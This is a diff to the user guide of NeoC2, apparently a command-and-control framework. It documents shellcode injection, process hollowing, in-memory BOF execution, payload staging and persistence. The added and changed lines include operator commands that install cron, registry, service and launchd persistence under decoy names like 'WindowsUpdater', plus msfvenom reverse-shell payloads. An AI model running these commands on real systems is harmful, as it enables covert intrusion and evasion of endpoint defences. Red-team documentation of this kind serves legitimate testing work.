@@ -8,13 +8,14 @@
 - [Task Management](#task-management)
 - [Agent Management](#agent-management)
 - [Interactive Mode](#interactive-mode)
-- [Modules and Post-Exploitation](#modules-and-post-exploitation)
 - [Evasion Techniques](#evasion-techniques)
 - [File Operations](#file-operations)
 - [Task Chaining](#task-chaining-web-ui-only)
+- [Powershell](#powershell)
+- [Inline-Execute](#inline-execute)
 - [PInject](#pinject)
 - [PEInject](#peinject)
-- [Persistence](#persistence)
+- [Persist](#persist)
 - [Event Monitoring](#event-monitoring)
 - [Security Features](#security-features)
 - [Autocompletion](#autocompletion)
@@ -212,7 +213,7 @@ See Agents & Stager Guide (on the sidebar) for complete agent type breakdown and
 
 ## Payload Staging
 
-NeoC2 supports staging payloads directly through the `payload_upload` base-command of the remote client server, allowing operators to deploy binary executables like .exe, .dll, or other file types in addition to Python scripts.
+NeoC2 supports staging payloads directly through the `payload_upload` base-command of the remote client server, allowing operators to deploy binary executables like .exe, .dll, or other file types in addition to Python scripts. The payload to be staged must be present on the command-and-control-sever and its path provided for staging.
 
 ### Capabilities
 - **Multi-Format Support**: Upload EXE, DLL, PY, JS, VBS, BAT, PS1, and other binary/script files
@@ -231,7 +232,7 @@ NeoC2 > stager generate linux_binary host=<c2_host> port=<c2_port> protocol=http
 
 ## Task Management
 
-NeoC2 implements a sophisticated task management system:
+Tasks are commands executed on an active agent session. NeoC2 implements a sophisticated task management system:
 
 ### Task Types
 
@@ -346,36 +347,6 @@ Start a netcat listener in another terminal and send the command below to the ag
 NeoC2 > tty_shell <ip> <port> # default port is 5000
 ```
 
-## Modules and Post-Exploitation
-
-NeoC2 includes a modular framework for post-exploitation activities. Using Python, Powershell or Bash. 
-
-### Available Modules
-
-```
-modules list                  # List available modules
-modules load <module_name>    # Load a specific module
-modules info <module_name>    # Get module information
-run <module_name> [options]   # Execute a module
-```
-
-### Module Categories
-
-1. **Evasion**: Bypass security mechanisms
-2. **Persistence**: Maintain access across reboots
-3. **Reconnaissance**: Gather system information
-4. **Lateral Movement**: Move to other systems
-
-### Example Module Usage
-
-```
-# Load and run sleep obfuscation module
-
-# Load and run persistence module
-modules load persistence
-run persistence agent_id=<id> method=registry payload_path=C:\payload.exe name=WindowsUpdate
-```
-
 ## Evasion Techniques
 
 NeoC2 implements multiple evasion techniques to bypass endpoint security:
@@ -401,9 +372,9 @@ NeoC2 provides enhanced file operations with automatic handling of encoded conte
 ### File Download 
 - Files are automatically base64-encoded during transfer 
    `download <remote_path>` - queues download task for the agent
-- CLI automatically detects and decodes base64 content for storage
-- Files saved to loot directory with timestamps and sanitized names
-- Download an agent executable or script from C2 Server to your local remote_client machine.
+- The command-and-control automatically detects and decodes base64 content for storage on C2's machine
+- Downloaded Files saved to loot directory with timestamps and sanitized names
+- Remote clients can also `download <logs_path_on_c2>` an agent executable or script from C2 Server to your local remote_client machine mid-operation.
 
 ### File Upload 
 - Local files are base64-encoded before transmission to agent
@@ -505,12 +476,52 @@ NeoC2 provides advanced task chaining capabilities, allowing operators to create
    - Service installation
    - File system persistence
 
+## Powershell
+
+This `pwsh` module helps operators run their own extendible powershell scripts on a Windows machine
+
+### Compatibility:
+- Go_agent
+- Phantom Hawk agent
+- Windows x64
+
+### Basic Usage:
+
+```
+pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]
+```
+
+## Inline-Execute
+
+This implementation enables pure in-memory execution of Beacon Object Files (BOFs) without any disk writes or PowerShell usage. The solution leverages the goffloader library to execute BOFs directly in the agent's memory space.
+
+#### Compatibility
+- Go_agent
+- Windows x64 
+
+#### Usage
+1. Place BOFs in modules/external/bof/ of the C2 Server
+2. Use the module with a BOF path
+3. The agent will in-memory execute the BOF using its COFFloader library
+4. BOF results are captured and sent back through C2 channel to operator
+5. No files written to disk at any stage; complete execution in agent's memory space
+
+### Command syntax
+Execute BOFs using the inline-execute command:
+
+```
+# In interactive mode, the agent ID is automatically inferred:
+inline-execute <path_to_bof_file> [arguments]
+```
+
+
 ## PInject
 
-In-memory shellcode injection 
+In-memory shellcode injection into a remote process
 
 #### Compatibility
 - Go_agent 
+- Windows x64
 
 #### Usage
 1. Generate compatible shellcode using msfvenom
@@ -551,10 +562,11 @@ run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode
 
 ## PEInject
 
-Inject an unmanaged PE using Process Hollowing
+Inject an unmanaged PE(Portable Executable) using Process Hollowing into a remote process
 
 #### Compatibility
 - Go_agent 
+- Windows x64
 
 #### Usage
 1. Generate compatible PE payload using msfvenom
@@ -585,9 +597,16 @@ run peinject pe_file=<payload_path> [agent_id=<agent_id>] # METHOD - 2 (Non-inte
 - windows/x64/shell_reverse_tcp
 - windows/x64/meterpreter/reverse_tcp
 
-## Persistence
+## Persist
 
-This is primarily a module that helps operators establishes persistence on systems using various techniques `modules info persistence`
+This module helps operators establishes persistence on systems using various techniques `modules info persistence`
+
+### Compatibility:
+- Go_agent
+- Phantom Hawk agent
+- Windows x64
+- Linux debian
+- MacOS
 
 #### Required Options:
 - `agent_id`: ID of the agent to establish persistence on
@@ -600,34 +619,27 @@ This is primarily a module that helps operators establishes persistence on syste
 
 #### Usage:
 
-**Linux/macOS Cron Persistence:**
 ```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh
-```
+# In interactive mode, the agent ID is automatically inferred:
+persist <method> <payload_path> [agent_id=<agent_id>] [name=<persistence_name>] [interval=<minutes>]
 
-**Windows Registry Persistence:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe
-```
+# Linux/macOS Cron Persistence:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh
 
-**Windows Startup Folder:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe
-```
+# Windows Registry Persistence:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe
 
-**Windows Service:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater
-```
+# Windows Startup Folder:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe
 
-**Linux Systemd Service:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30
-```
+# Windows Service:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater
 
-**macOS LaunchAgent:**
-```
-run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
+Linux Systemd Service:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30
+
+macOS LaunchAgent:
+persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
 ```
 
 
